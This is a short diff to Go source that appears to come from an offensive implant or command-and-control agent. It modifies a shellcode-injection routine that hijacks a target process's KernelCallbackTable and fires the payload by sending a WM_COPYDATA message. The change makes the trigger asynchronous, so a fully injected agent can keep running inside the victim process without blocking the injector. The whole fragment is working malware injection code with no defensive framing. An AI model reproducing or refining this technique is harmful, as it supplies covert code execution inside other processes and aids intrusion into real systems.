@@ -508,19 +508,23 @@ func executeOpusVariant4(shellcode []byte, pid uint32) (string, error) {
 		LpData: uintptr(unsafe.Pointer(&data[0])),
 	}
 
-	// Send WM_COPYDATA
-	result, _, _ := procSendMessageA.Call(
-		uintptr(hwnd),
-		uintptr(WM_COPYDATA),
-		uintptr(hwnd),
-		uintptr(unsafe.Pointer(&cds)),
-	)
+	// Send WM_COPYDATA in a goroutine to avoid blocking
+	// The injected shellcode (if it's a full agent) will run forever and never return,
+	// which would block SendMessage indefinitely. Running async allows this agent to continue.
+	go func() {
+		procSendMessageA.Call(
+			uintptr(hwnd),
+			uintptr(WM_COPYDATA),
+			uintptr(hwnd),
+			uintptr(unsafe.Pointer(&cds)),
+		)
+	}()
 
-	output += fmt.Sprintf("[+] SendMessage returned: %d\n", result)
-	output += "[+] Shellcode should have executed!\n"
+	output += "[+] Sent WM_COPYDATA message (async)\n"
+	output += "[+] Shellcode should execute momentarily\n"
 
-	// Wait briefly for execution
-	time.Sleep(1000 * time.Millisecond)
+	// Brief sleep to allow goroutine to execute
+	time.Sleep(500 * time.Millisecond)
 
 	// Step 13: Restore original KernelCallbackTable pointer
 	err = writeProcessMemoryPtr(hProcess, kernelCallbackTablePtrAddr, kernelCallbackTable)
